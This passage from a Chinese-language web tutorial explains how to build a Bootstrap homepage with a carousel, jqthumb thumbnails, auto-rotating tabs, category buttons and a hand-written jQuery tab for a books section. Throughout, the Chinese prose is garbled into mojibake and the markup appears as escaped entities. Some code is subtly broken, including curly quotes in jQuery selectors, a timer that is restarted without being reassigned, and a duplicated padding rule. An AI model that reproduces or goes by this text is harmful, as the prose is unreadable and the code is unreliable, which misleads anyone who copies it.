‡ç­¾é¡µæ’ä»¶ï¼ˆtabsï¼‰â€”â€”å¯¹æ’ä»¶çš„æ ·å¼è¿›è¡Œäº†ç¾åŒ–ï¼Œå¹¶å¢åŠ äº†è‡ªåŠ¨åˆ‡æ¢åŠŸèƒ½ã€‚ 3.ä¿¡æ¯æŒ‰é’®ï¼ˆbtn-infoï¼‰ç»„ä»¶â€”â€”ç”¨å®ƒåˆ—å‡ºæ–‡ç« åˆ†ç±»ä¿¡æ¯ã€‚ 3.å›¾ä¹¦æ¿å—éœ€è¦ç”¨åˆ°çš„å…ƒç´  1.è‡ªå·±å¼€å‘çš„Jquery Tabæ’ä»¶ 2.ç¼©ç•¥å›¾(thumbnail)ç»„ä»¶ 3.åˆ†ç±»æ ‡ç­¾(ä»¿è±†ç“£) 4.ç”¨æˆ·æ¿å—ç”¨åˆ°çš„BootStrapå…ƒç´  1.BootStrapåŸç”Ÿtab 2.åœ†å½¢å›¾ç‰‡ï¼ˆimage_circleï¼‰ æ–‡ç« æ¿å—çš„è®¾è®¡ä¸å®ç°å¸ƒå±€æ€æ ·çš„å¸ƒå±€æ‰èƒ½è®©ç½‘ç«™ä¸­çš„æ–‡ç« ä»¥è¾ƒå¥½çš„å½¢å¼å‘ˆç°åœ¨é¦–é¡µä¸Šå‘¢ï¼Ÿæ—¢è¦ååº”æ›´æ–°ï¼Œåˆè¦æœ‰ç²¾åã€‚ç”±äºæ–‡ç« æ¿å—åœ¨é¦–é¡µä¸Šå¤„äºæœ€ä¸Šé¢çš„éƒ¨åˆ†ï¼Œæ‰€ä»¥ï¼Œè€ƒè™‘ä½¿ç”¨è½®æ¢å›¾ç‰‡æ’ä»¶æ¥å¸å¼•çœ¼çƒï¼Œå¹¶ä¸”è¿˜éœ€è¦å±•ç¤ºæœ€æ–°çš„æ–‡ç« å’Œçƒ­é—¨æ–‡ç« ä»¥åŠæ–‡ç« åˆ†ç±»ã€‚åˆ’åˆ†å¦‚ä¸‹ï¼š å·¦éƒ¨â€”â€”è½®æ¢å›¾ç‰‡(carousel)å’Œæ–‡ç« åˆ—è¡¨(tabs)éƒ¨åˆ†ï¼Œå„å ä¸€åŠã€‚ å³éƒ¨â€”â€”æ–‡ç« åˆ†ç±»éƒ¨åˆ†ã€‚ å·¦è¾¹å æ®ï¼ˆ8/12ï¼‰ï¼Œå³è¾¹å æ®ï¼ˆ4/12ï¼‰ å¸ƒå±€ä»£ç å¦‚ä¸‹ï¼š &lt;!--æ¿å—çš„å·¦éƒ¨ï¼Œä½¿ç”¨panelï¼Œå æ®8/12--&gt; &lt;div class=&quot;panel panel-default col-md-8&quot;&gt; &lt;!--è½®æ¢å›¾ç‰‡ï¼ˆcarouselï¼‰æ’ä»¶,å å·¦éƒ¨çš„ä¸€åŠ--&gt; &lt;div class=&quot;col-md-6&quot;&gt; &lt;div class=&quot;carousel slide&quot; &gt; &lt;/div&gt; &lt;/div&gt; &lt;!--æ–‡ç« tabsï¼Œå å·¦éƒ¨çš„ä¸€åŠ--&gt; &lt;div class=&quot;noborder col-md-6&quot;&gt; &lt;div class=&quot;tab&quot; role=&quot;tabpanel&quot;&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--æ¿å—çš„å³éƒ¨ï¼Œä½¿ç”¨æ™®é€šçš„DIVï¼Œå æ®4/12--&gt; &lt;div class=&quot;col-md-4&quot;&gt; &lt;/div&gt; ä½¿ç”¨Carouselï¼ˆè½®æ¢å›¾ç‰‡ï¼‰æ’ä»¶é¦–é¡µä¸­ä½¿ç”¨Carouselæ’ä»¶å¾€å¾€èƒ½è¾¾åˆ°å¸ç›çš„ç›®çš„ï¼Œæ˜¯ç”¨æ¥å±•ç¤ºå›¾æ–‡å†…å®¹çš„æœ€ä½³æ‰‹æ®µã€‚åœ¨é¡µé¢ä¸­ä½¿ç”¨carsouelæ’ä»¶å¾ˆå®¹æ˜“ï¼Œå¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š 1.åœ¨DIVçš„classå±æ€§ä¸­åŠ å…¥carousel åŠ å…¥carouselåï¼Œè¯¥DIVå°±æ˜¯ä¸€ä¸ªè½®æ¢å›¾ç‰‡æ’ä»¶äº† &lt;div class=&quot;carousel slide&quot; data-ride=&quot;carousel&quot;&gt; &lt;/div&gt; 2.è®¾ç½®å†…å®¹åŒºï¼ˆcarsouel-innerï¼‰ åœ¨ä¸Šè¿°DIVä¸­åŠ å…¥æ–°çš„DIVä½œä¸ºå…¶ä¸»ä½“å†…å®¹ï¼Œå…¶class=&quot;carsouel-inner&quot;ã€‚ &lt;div class=&quot;carousel-inner&quot; role=&quot;listbox&quot;&gt; &lt;/div&gt; 3.åœ¨å†…å®¹åŒºä¸­æ”¾å…¥è¦å±•ç¤ºçš„å…ƒç´ ï¼ˆitemï¼‰ &lt;div class=&quot;item active&quot;&gt; &lt;a href=&quot;åŒ…å«å›¾ç‰‡æ–‡ç« è·¯å¾„&quot;&gt; &lt;img src=&quot;å›¾ç‰‡è·¯å¾„&quot; alt=&quot;å›¾ç‰‡ä¿¡æ¯&quot;/&gt;&lt;/a&gt; &lt;div class=&quot;carousel-caption&quot;&gt; &lt;h4 class=&quot;alpha&quot;&gt; &lt;a style=&quot;color:white;&quot; href=&quot;åŒ…å«å›¾ç‰‡æ–‡ç« è·¯å¾„&quot;&gt;å›¾ç‰‡æ ‡é¢˜&lt;/a&gt; &lt;/h4&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--å…¶ä»–item--&gt; å¯ä»¥çœ‹åˆ°åœ¨å…ƒç´ åŒºä¸­åŒ…å«æ–‡ç« å±•ç¤ºä¿¡æ¯â€”â€”æ–‡å†…å›¾ç‰‡+æ ‡é¢˜+æŒ‡å‘æ–‡ç« çš„é“¾æ¥ã€‚ 4.æŒ‰é’®åŒºï¼ˆcarousel-controlï¼‰ æœ€åæ”¾å…¥ï¼Œâ€œä¸Šä¸€ä¸ªâ€ï¼Œâ€œä¸‹ä¸€ä¸ªâ€æŒ‰é’®ï¼ˆå·¦å³ç®­å¤´ï¼‰ï¼Œç”¨äºç”¨æˆ·è‡ªä¸»åˆ‡æ¢ã€‚ &lt;a class=&quot;left carousel-control&quot; href=&quot;#carousel-example-generic&quot; role=&quot;button&quot; data-slide=&quot;prev&quot;&gt; &lt;span class=&quot;glyphicon glyphicon-chevron-left&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;span class=&quot;sr-only&quot;&gt;Previous&lt;/span&gt; &lt;/a&gt; &lt;a class=&quot;right carousel-control&quot; href=&quot;#carousel-example-generic&quot; role=&quot;button&quot; data-slide=&quot;next&quot;&gt; &lt;span class=&quot;glyphicon glyphicon-chevron-right&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; &lt;span class=&quot;sr-only&quot;&gt;Next&lt;/span&gt; å›¾ç‰‡å˜å½¢ è¿è¡Œå³ä¾§çš„ä»£ç ä¸­å¯ä»¥çœ‹å‡º,å½“ä¸åŒé•¿å®½æ¯”çš„å›¾ç‰‡è¯•å›¾å æ»¡å…ƒç´ (item)åŒºæ—¶ï¼Œå›¾ç‰‡å‘ç”Ÿäº†å˜å½¢ã€‚ è§£å†³å±•ç¤ºæ—¶å›¾ç‰‡å˜å½¢çš„é—®é¢˜è¿è¡Œä¸ŠèŠ‚çš„ä»£ç æˆ‘ä»¬å‘ç°æ’ä»¶ä¸­çš„å›¾ç‰‡å‘ç”Ÿäº†å˜å½¢ï¼Œåˆ†æå…¶åŸå› ä¸ºï¼šè½®æ¢æ’ä»¶ä¸­çš„å›¾ç‰‡ä½¿ç”¨çš„æ–‡ç« ä¸­çš„ç¬¬ä¸€å¼ å›¾ç‰‡ï¼Œå›¾ç‰‡çš„å¤§å°ä¸ä¸€ï¼Œè€Œè½®æ’­æ’ä»¶çš„å¤§å°åŸºæœ¬æ˜¯å›ºå®šçš„ï¼Œæ‰€ä»¥å±•ç¤ºçš„æ—¶å€™å›¾ç‰‡å‡ºç°äº†å˜å½¢ã€‚ä¸‹é¢çœ‹çœ‹æ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜ï¼š 1.å¼•å…¥Jqthumb.js åœ¨BootStrapä¸­æˆ‘ä»¬æ‰¾ä¸åˆ°è§£å†³åŠæ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å€ŸåŠ©å…¶å®ƒå·¥å…·ã€‚Jqthumbæ’ä»¶æ˜¯ä¸“é—¨ç”¨æ¥ä¸ºå›¾ç‰‡ç”Ÿæˆç¼©ç•¥å›¾çš„ï¼Œå®ƒå¯ä»¥ä»å›¾ç‰‡ä¸­çš„ä»»ä½•åæ ‡ç‚¹å¼€å§‹å–æŒ‡å®šå¤§å°çš„å›¾ç‰‡åŒºåŸŸä½œä¸ºå›¾ç‰‡çš„ç¼©ç•¥å›¾ã€‚ä½ å¯ä»¥ç‚¹å‡» https://github.com/pakcheong/jqthumb æ¥ä¸‹è½½å®ƒï¼Œå¹¶å°†å…¶åº”ç”¨åˆ°é¡¹ç›®ä¸­(å‡è®¾åœ¨å½“å‰é¡¹ç›®ä¸­ï¼Œjqthumb.jsæ”¾ç½®åœ¨scriptsæ–‡ä»¶å¤¹ä¸­): &lt;script type=&quot;text/javascript&quot; src=&quot;/scripts/jqthumb.js&quot;&gt;&lt;/script&gt; 2.åœ¨å›¾ç‰‡åŠ è½½(onload)çš„æ—¶å€™è°ƒç”¨DrawImage()å‡½æ•°æ¥ç”Ÿæˆç¼©ç•¥å›¾ DrawImage()å‡½æ•°æ­£æ˜¯åŸºäºjqthumb.jsåº“çš„ï¼Œæ³¨æ„è¯¥å‡½æ•°ä¸€å®šè¦å†™åœ¨è½®æ¢æ’ä»¶å‰ï¼Œå› ä¸ºæˆ‘ä»¬å¿…é¡»åœ¨å›¾ç‰‡åŠ è½½å‰ç”Ÿæˆç¼©ç•¥å›¾ã€‚DrawImage()å‡½æ•°ä»£ç å¦‚ä¸‹ï¼š &lt;!--å¯¼å…¥æ’ä»¶--&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/scripts/jqthumb.js&quot;&gt;&lt;/script&gt; &lt;script&gt; function DrawImage(hotimg) { $(hotimg).jqthumb({ classname : &apos;jqthumb&apos;, width : &apos;100%&apos;,//å®½åº¦ height : &apos;300px&apos;,//é«˜åº¦ position : { y: &apos;50%&apos;, x: &apos;50%&apos;},//ä»å›¾ç‰‡çš„ä¸­é—´å¼€å§‹äº§ç”Ÿç¼©ç•¥å›¾ zoom : &apos;1&apos;,//ç¼©æ”¾æ¯”ä¾‹ method : &apos;auto&apos;,//æäº¤æ–¹æ³•ï¼Œç”¨äºä¸åŒçš„æµè§ˆå™¨ç¯å¢ƒï¼Œé»˜è®¤ä¸ºâ€˜autoâ€™ }); } &lt;/script&gt; åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†jqthumbï¼Œå¹¶ä¸”ä¼ å…¥äº†ç›¸å…³åˆå§‹åŒ–å‚æ•°ã€‚è°ƒç”¨äº†è¯¥å‡½æ•°åï¼Œåœ¨å›¾ç‰‡åŠ è½½çš„æ—¶å€™ï¼Œå°±ä¼šæŒ‰ç…§ä¸Šè¿°å‚æ•°äº§ç”Ÿå›¾ç‰‡çš„ç¼©ç•¥å›¾ï¼Œä»è€Œè§£å†³å›¾ç‰‡å˜å½¢é—®é¢˜ã€‚ç”±äºç¼©ç•¥å›¾æ˜¯ä»åŸå§‹å›¾ç‰‡çš„æ­£ä¸­é—´å¼€å§‹å¾€ä¸¤è¾¹å–å¾—ï¼Œæ‰€ä»¥è¯¥ç¼©ç•¥å›¾åŒ…å«äº†å›¾ç‰‡çš„ä¸»è¦å†…å®¹ã€‚ é’ˆå¯¹BootStrap tabçš„äºŒæ¬¡å¼€å‘ä¸ºä»€ä¹ˆè¦è¿›è¡ŒäºŒæ¬¡å¼€å‘ åœ¨æ–‡ç« åˆ—è¡¨éƒ¨åˆ†ï¼Œæˆ‘ä»¬ä½¿ç”¨äº†BootStrapçš„Tabæ’ä»¶ã€‚BootStrapä¸­çš„tabæ§ä»¶æ˜¯åœ¨ä¸€å°å—åŒºåŸŸå±•ç¤ºå¤§é‡ä¿¡æ¯çš„é¦–é€‰ã€‚ä½†æ˜¯ï¼Œå®ƒçš„æ ·å¼æ¯”è¾ƒå•ä¸€ã€‚è€Œåœ¨å±•ç¤ºæ–‡ç« åˆ—è¡¨æ¨¡å—æ—¶ï¼Œæˆ‘å¸Œæœ›å®ƒå¯ä»¥æ›´ç¾è§‚ï¼Œè€Œä¸”é€‰é¡¹å¡å¯ä»¥è‡ªåŠ¨åˆ‡æ¢ã€‚ ä½¿ç”¨Tabæ’ä»¶ åœ¨é¡µé¢ä¸­ä½¿ç”¨BootStrapçš„Tabæ’ä»¶çš„æ–¹æ³•å¦‚ä¸‹ï¼š 1.åœ¨DIVåŠ å…¥role=â€tabpanelâ€ åŠ å…¥è¯¥å±æ€§å€¼åï¼Œè¯¥DIVåˆ™å˜æˆäº†tabæ’ä»¶ã€‚ &lt;div class=&quot;tab&quot; role=&quot;tabpanel&quot;&gt; &lt;/div&gt; 2.ä½¿ç”¨åˆ—è¡¨åˆ¶ä½œåˆ‡æ¢æ ‡ç­¾ åˆ—è¡¨é¡¹å³ä¸ºåˆ‡æ¢æ ‡ç­¾é¡¹ã€‚ &lt;ul class=&quot;nav nav-tabs&quot; role=&quot;tablist&quot; style=&quot;margin-top:0px;&quot; id=&quot;docTabs&quot;&gt; &lt;li role=&quot;presentation&quot; class=&quot;active&quot;&gt;&lt;a href=&quot;#Section_new&quot; aria-controls=&quot;home&quot; role=&quot;tab&quot; data-toggle=&quot;tab&quot;&gt; æœ€æ–°&lt;/a&gt;&lt;/li&gt; &lt;!--å…¶ä½™æ ‡ç­¾å¡â€¦â€¦--&gt; &lt;/ul&gt; ä»£ç ä¸­å¯ä»¥çœ‹å‡ºï¼Œåœ¨è¶…çº§é“¾æ¥å…ƒç´ ï¼ˆaï¼‰ä¸­æœ‰æŒ‡å‘è¯¥æ ‡ç­¾é¡µå†…å®¹çš„é“¾æ¥åœ°å€ï¼Œå¦‚â€œæœ€æ–°â€æ ‡ç­¾ä¸­ï¼Œhref=&quot;#Section_new&quot;,è€Œè¿™ä¸ªåœ°å€ä¸€å®šè¦è·Ÿåé¢çš„æ ‡ç­¾å†…å®¹é¡µï¼ˆtab-paneï¼‰çš„IDä¸€ä¸€å¯¹åº”ã€‚ 3.æ ‡ç­¾å†…å®¹é¡µåŒºåŸŸï¼ˆtab-contentï¼‰ æ‰€æœ‰çš„æ ‡ç­¾å†…å®¹é¡µå‡æ”¾åœ¨è¿™ä¸ªåŒºåŸŸã€‚ &lt;div class=&quot;tab-content&quot;&gt; &lt;!--æœ€æ–°--&gt; &lt;!--7å¤©çƒ­é—¨--&gt; &lt;!--30å¤©çƒ­é—¨--&gt; &lt;/div&gt; 4.å•ä¸ªæ ‡ç­¾é¡µï¼ˆtab-paneï¼‰ tabæ’ä»¶çš„æœ€å°å…ƒç´ ï¼Œå…·ä½“çš„æ ‡ç­¾å†…å®¹é¡µã€‚ &lt;div role=&quot;tabpanel&quot; class=&quot;tab-pane fade in active&quot; id=&quot;Section_new&quot;&gt; &lt;P&gt; tabä¸­çš„å†…å®¹ &lt;/P&gt; &lt;/div&gt; &lt;!--å…¶ä½™æ ‡ç­¾é¡µâ€¦â€¦--&gt; tabæ ·å¼ç¾åŒ–ä¸‹é¢æˆ‘ä»¬æ¥ç¾åŒ–ä¸€ä¸‹tabçš„æ ·å¼å§ï¼Œé€šè¿‡CSSä»£ç æ¥è®¾ç½®tabæ’ä»¶çš„æ ·å¼ï¼Œè¿™äº›æ ·å¼ä¼šè¦†ç›–æ‰bootstrapä¸­çš„åŸæœ‰æ ·å¼è¾¾åˆ°ç¾åŒ–tabçš„æ•ˆæœï¼Œä¸»è¦åŒ…æ‹¬: æ ‡ç­¾çš„å½¢çŠ¶å’ŒèƒŒæ™¯è‰² å½“å‰(è¢«é€‰ä¸­)æ ‡ç­¾çš„æ ·å¼å’ŒèƒŒæ™¯è‰² æ ‡ç­¾å†…å®¹é¡µæ ·å¼ ä¸å°å±å¹•å…¼å®¹ //æ ‡ç­¾æ ·å¼ .tab .nav-tabs { â€¦â€¦//è¯¦è§å³ä¾§ä»£ç  } //æ ‡ç­¾é“¾æ¥æ ·å¼ .tab .nav-tabs li a { background: transparent; â€¦â€¦//è¯¦è§å³ä¾§ä»£ç  } //å½“å‰é€‰ä¸­æ ‡ç­¾æ ·å¼ .tab .nav-tabs li.active a, .tab .nav-tabs li.active a i { â€¦â€¦//è¯¦è§å³ä¾§ä»£ç  } //å½“å‰é€‰ä¸­æ ‡ç­¾ä¹‹åæ’å…¥çš„æ ·å¼ .tab .nav-tabs li.active a:after { â€¦â€¦//è¯¦è§å³ä¾§ä»£ç  } //æ ‡ç­¾å†…å®¹é¡µæ ·å¼ .tab .tab-content { â€¦â€¦//è¯¦è§å³ä¾§CSSä»£ç  } //åœ¨å°å±å¹•ä¸­çš„æ ·å¼ @media only screen and (max-width: 480px) { â€¦â€¦//è¯¦è§å³ä¾§ä»£ç  } tabsè‡ªåŠ¨åˆ‡æ¢åŠŸèƒ½çš„å®ç°æ–‡ç« åˆ—è¡¨ä¸­åˆ—å‡ºçš„æœ€æ–°ã€7å¤©çƒ­é—¨ã€30å¤©çƒ­é—¨è¿™ä¸‰ä¸ªé€‰é¡¹å¡æ¯éš”5ç§’é’Ÿè‡ªåŠ¨åˆ‡æ¢ï¼Œå½“é¼ æ ‡æ‚¬åœåˆ°æŸé€‰é¡¹å¡çš„æ—¶å€™ï¼Œåˆ™æš‚åœè½®æ¢ï¼Œç§»å¼€åï¼Œç»§ç»­åˆ‡æ¢ã€‚ä»£ç è®¾è®¡æ€è·¯å¦‚ä¸‹ï¼š è®¾ç½®ä¸€ä¸ªå®šæ—¶å™¨timer()ï¼Œæ¯éš”5ç§’é’Ÿå¯¹æ ‡ç­¾é¡µè¿›è¡Œåˆ‡æ¢ä¸€æ¬¡ã€‚ åœ¨ç½‘é¡µåŠ è½½å®Œä»¥åå°±è¿è¡Œè¯¥å®šæ—¶å™¨ã€‚ å½“ç”¨æˆ·é¼ æ ‡æ‚¬åœåˆ°æŸä¸ªæ ‡ç­¾é¡µä¸Šæ—¶ï¼Œæ¸…é™¤è¯¥ï¼ˆclearIntervalï¼‰å®šæ—¶å™¨ã€‚ é¼ æ ‡ç§»å¼€åï¼Œç»§ç»­ä½¿ç”¨å®šæ—¶å™¨ã€‚ //tabsè‡ªåŠ¨è½®æ¢ function timer(i) { interval=setInterval(function() { $(&quot;#docTabs li:eq(&quot;+i+&quot;) a&quot;).tab(&apos;show&apos;); i++; if(i&gt;2) i=0; } ,5000); return interval; } $(function(){ var i=0; interval=timer(i); //å½“é¼ æ ‡æ‚¬åœåœ¨åˆ—è¡¨åŒºåŸŸæ—¶æš‚åœè½®æ¢ $(â€œ.tab-paneâ€).mouseover(function(){ clearInterval(interval); }); //é¼ æ ‡ç§»å¼€æ—¶ç»§ç»­è½®æ¢ $(â€œ.tab-paneâ€).mouseout(function(){ timer(i); }); }); åˆ†ç±»å±•ç¤ºå®ç°è¿‡ç¨‹ æ–‡ç« åˆ†ç±»å±•ç¤ºéƒ¨åˆ†é‡‡ç”¨äº†BootStrapåŸç”Ÿçš„ä¿¡æ¯æŒ‰é’®ï¼ˆbtn-infoï¼‰,å½“é¼ æ ‡æ‚¬åœæ—¶å˜è‰²ï¼Œç‚¹å‡»åˆ™è½¬å‘ç›¸åº”çš„äºŒçº§é¡µé¢ï¼Œä»£ç å¦‚ä¸‹ï¼š &lt;div class=&quot;col-md-4&quot; style=&quot;float:right;&quot;&gt; &lt;div&gt; &lt;H5&gt;åˆ† ç±»&lt;/H5&gt; &lt;div style=&quot;font-size:14px;&quot; id=&quot;blogclas&quot;&gt; &lt;a style=&quot;margin-left:5px; margin-bottom:5px;&quot; class=&quot;btn btn-info col-md-3&quot; href=&quot;äºŒçº§é¡µé¢åœ°å€&quot; role=&quot;button&quot;&gt;åˆ†ç±»å&lt;/a&gt; &lt;!--å…¶ä»–åˆ†ç±»ä¿¡æ¯--&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; ä»£ç åˆ†æ ç”±ä»£ç å¯çŸ¥ï¼Œåˆ†ç±»åŒºåŸŸå æœ‰çš„å®½åº¦ä¸ºï¼ˆ4/12ï¼‰col-md-4ï¼Œè€Œå…¶ä¸­çš„å•ä¸ªåˆ†ç±»åˆå æœ‰å…¶ä¸­çš„ï¼ˆ3/12ï¼‰ col-md-3ï¼Œä¹Ÿå°±æ˜¯æ¯4ä¸ªåˆ†ç±»å ä¸€è¡Œï¼ˆå®é™…ä¸Šç”±äºåˆ†ç±»ä¹‹é—´è¦æœ‰é—´éš”ï¼Œåªèƒ½æ˜¯3ä¸ªåˆ†ç±»å ä¸€è¡Œï¼‰ã€‚ å›¾ä¹¦æ¿å—çš„è®¾è®¡ä¸å®ç°å¸ƒå±€å›¾ä¹¦æ¿å—çš„å¸ƒå±€æ—¢è¦è€ƒè™‘åˆ°åˆ†ç±»å±•ç¤ºå›¾ä¹¦ä¿¡æ¯ï¼Œè¿˜éœ€è¦è€ƒè™‘ä¸å‰é¢æ–‡ç« æ¿å—çš„å¯¹åº”ï¼Œæ‰€ä»¥ï¼Œå›¾ä¹¦æ¿å—ä¹Ÿåˆ†ä¸ºå·¦å³ä¸¤éƒ¨åˆ†ï¼Œå·¦è¾¹åŒæ ·ä½¿ç”¨col-md-8,å³è¾¹ä½¿ç”¨col-md-4æ¥åˆ’åˆ†å®½åº¦ã€‚å½“ç„¶ï¼Œå¦‚æœåœ¨å…¶å®ƒå±å¹•æœ‰ä¸åŒçš„å¸ƒå±€éœ€æ±‚ï¼Œä½ ä¹Ÿå¯ä»¥æ·»åŠ ä¸Šå…¶ä»–çš„å±æ€§å€¼ï¼Œå¦‚col-xs-6ï¼ˆåœ¨æ‰‹æœºå±å¹•ä¸­å 6/12ï¼‰ç­‰ã€‚å¸ƒå±€ä»£ç å¦‚ä¸‹ï¼š &lt;div class=&quot;col-md-8&quot; id=&quot;indexbooks&quot;&gt; é¦–é¡µå›¾ä¹¦å±•ç¤ºåŒºâ€¦â€¦ &lt;/div&gt; &lt;div class=&quot;col-md-4&quot;&gt; å›¾ä¹¦åˆ†ç±»å±•ç¤ºåŒºâ€¦â€¦ &lt;/div&gt; å¼€å‘Jquery tabä¸ºä»€ä¹ˆè¦è‡ªå·±å†™tab ä¸ºäº†æ›´å¥½çš„åœ¨é¦–é¡µå›¾æ–‡å¹¶èŒ‚çš„å±•ç¤ºå›¾ä¹¦ä¿¡æ¯ä»¥åŠæŒ‰ç±»åˆ«å±•ç¤ºå°½å¯èƒ½å¤šçš„å›¾ä¹¦ï¼Œæˆ‘å†³å®šä½¿ç”¨Jqueryå¼€å‘è‡ªå·±çš„tabã€‚ä¸‹é¢æ¥çœ‹çœ‹æˆ‘çš„å®ç°è¿‡ç¨‹ã€‚ HTMLéƒ¨åˆ† 1.æ ‡ç­¾é¡¹ æ ‡ç­¾ä»ç„¶ä½¿ç”¨åˆ—è¡¨æ¥å®Œæˆï¼Œåˆ—è¡¨é¡¹å³ä¸ºæ ‡ç­¾é¡¹ã€‚ &lt;ul id=&quot;booksfilter&quot; style=&quot;float:right;font-size:14px;&quot;&gt; &lt;li&gt;&lt;a class=&quot;cur&quot; href=&quot;javascript:void(0);&quot;&gt;å…¥é—¨&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;javascript:void(0);&quot;&gt;å®æˆ˜&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;javascript:void(0);&quot;&gt;è¿›é˜¶&lt;/a&gt;&lt;span&gt;|&lt;/span&gt;&lt;/li&gt; &lt;/ul&gt; å…¶ä¸­â€™aâ€™æ ‡ç­¾çš„class=â€curâ€è¡¨ç¤ºå½“å‰è¢«é€‰ä¸­çš„æ ‡ç­¾ã€‚åé¢å†CSSä¸­ä¼šè®¾ç½®å®ƒçš„æ ·å¼ã€‚ 2.æ ‡ç­¾é¡µå†…å®¹åŒº ä½¿ç”¨3ä¸ªDIV,åˆ†åˆ«å­˜æ”¾å…¥é—¨ã€å®æˆ˜å’Œè¿›é˜¶çš„å›¾ä¹¦ã€‚ &lt;div class=&quot;booklist&quot;&gt; å…¥é—¨çº§å›¾ä¹¦â€¦â€¦ &lt;/div&gt; &lt;div class=&quot;booklist&quot; style=&quot;display:none;&quot;&gt; å®æˆ˜ç±»å›¾ä¹¦â€¦â€¦ &lt;/div&gt; &lt;div class=&quot;booklist&quot; style=&quot;display:none;&quot;&gt; è¿›é˜¶ç±»å›¾ä¹¦â€¦â€¦ &lt;/div&gt; å¯ä»¥çœ‹åˆ°ï¼Œåˆå§‹æ—¶ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªæ ‡ç­¾é¡µçš„å†…å®¹æ˜¯æ˜¾ç¤ºçš„ï¼Œè€Œå…¶å®ƒä¸¤ä¸ªæ ‡ç­¾é¡µå†…å®¹æ˜¯éšè—ï¼ˆstyle=&quot;display:none;&quot;ï¼‰çš„,åé¢ä¼šåˆ©ç”¨Jqueryæ¥æ§åˆ¶ä»–ä»¬çš„åˆ‡æ¢ã€‚ 3.ä½¿ç”¨ç¼©ç•¥å›¾ï¼ˆthumbnailï¼‰ç»„ä»¶å±•ç¤ºå›¾ä¹¦ä¿¡æ¯ åœ¨è¯¥ç»„ä»¶ä¸­åŒ…å«äº†å›¾ä¹¦å°é¢ã€å›¾ä¹¦æ ‡é¢˜ã€å’Œé“¾æ¥åˆ°è¯¥å›¾ä¹¦é¡µé¢çš„è¶…çº§é“¾æ¥ã€‚ &lt;div class=&quot;thumbnail&quot; style=&quot;height:220px; border-width:0px;&quot;&gt; &lt;a href=&quot;/book/577e11aa2f33c&quot; target=&quot;_blank&quot;&gt; &lt;img style=&quot;height:130px;&quot; src=&quot;http://img3.doubanio.com/mpic/s1039608.jpg&quot;&gt; &lt;/a&gt; &lt;div class=&quot;caption&quot;&gt; &lt;h5 style=&quot;text-align:center;&quot;&gt; &lt;a href=&quot;/book/577e11aa2f33c&quot; target=&quot;_blank&quot;&gt; LINUXæƒå¨æŒ‡å—ï¼ˆ... &lt;/a&gt;&lt;/h5&gt; &lt;p style=&quot;text-align:center;&quot;&gt; è¯„è®º(0) &lt;span class=&quot;badge&quot;&gt;1æ¨è&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; &lt;/div&gt; å¦å¤–ï¼Œæ¯æœ¬å›¾ä¹¦æ‰€å çš„å®½åº¦ä¸ºcol-md-3,ä¹Ÿå°±æ˜¯æ¯4æœ¬ä¹¦å æ®ä¸€è¡Œã€‚ è®¾è®¡Tabçš„æ ·å¼ä¸‹é¢æˆ‘ä»¬æ¥è®¾è®¡ä»–çš„CSSæ ·å¼ï¼Œè®©æˆ‘ä»¬çš„tabså°½é‡ç¾è§‚ã€‚è¿™äº›æ ·å¼ä¸»è¦åŒ…æ‹¬ï¼š æ ‡ç­¾é¡¹æ ·å¼ æ ‡ç­¾é¡¹ä¸­é“¾æ¥çš„æ ·å¼ å½“å‰è¢«é€‰ä¸­æ ‡ç­¾çš„æ ·å¼ï¼ˆcurï¼‰ //é€‰é¡¹å¡åˆ—è¡¨æ ·å¼ #booksfilter li { padding:5px;//å†…è¾¹è· 5px list-style-type:none; float:left; padding:0px; } //è®¾ç½®â€˜|â€™çš„å·¦å³è¾¹è· #booksfilter span { margin-left:5px; margin-right:5px; } //é€‰é¡¹å¡é“¾æ¥çš„æ ·å¼ #booksfilter a { padding:5px;//å†…è¾¹è·ï¼š5px text-decoration:none;//æ— ä¸‹åˆ’çº¿ } //é€‰é¡¹å¡è¢«é€‰ä¸­æˆ–å½“é¼ æ ‡ç§»åŠ¨åˆ°é€‰é¡¹å¡æ—¶çš„æ ·å¼ #booksfilter a.cur,#booksfilter a:hover { background-color:#e67e22;//èƒŒæ™¯è‰² color:white;//å‰æ™¯è‰² border-radius:5px;//åœ†è§’ } ä»£ç æ³¨é‡Šå·²ç»å¾ˆè¯¦ç»†äº†ï¼Œå½“ç„¶å¤§å®¶ä¹Ÿå¯ä»¥ä¿®æ”¹å®ƒæ¥è®¾è®¡å‡ºæ›´ç¾çš„æ ·å¼ã€‚ å®ç°Tabçš„è¡Œä¸ºå½“æ ‡ç­¾é¡¹ç‚¹å‡»åˆ‡æ¢çš„æ—¶å€™ï¼Œè¿™éƒ¨åˆ†çš„äº¤äº’å°±è¦äº¤ç»™Jqueryä»£ç æ¥å®Œæˆäº†ã€‚ ä»£ç è®¾è®¡æ€è·¯å¦‚ä¸‹ï¼š éå†æ‰€æœ‰çš„æ ‡ç­¾é¡µï¼Œä¸ºæ¯ä¸ªæ ‡ç­¾é¡µæ·»åŠ ç‚¹å‡»(click)äº‹ä»¶çš„å¤„ç†å‡½æ•° åœ¨è¯¥å¤„ç†å‡½æ•°ï¼Œé«˜äº®ï¼ˆä½¿ç”¨Jqueryåœ¨è¯¥æ ‡ç­¾é¡¹çš„classä¸­æ·»åŠ curï¼‰æ˜¾ç¤ºå½“å‰æ ‡ç­¾é¡¹å’Œå…¶å¯¹åº”çš„æ ‡ç­¾é¡µï¼Œéšè—å…¶å®ƒã€‚ $(function() { $(&apos;#booksfilter a&apos;).each(function(i) {//å¯¹æ¯ä¸ªtabsä¸­çš„æ ‡ç­¾æ·»åŠ 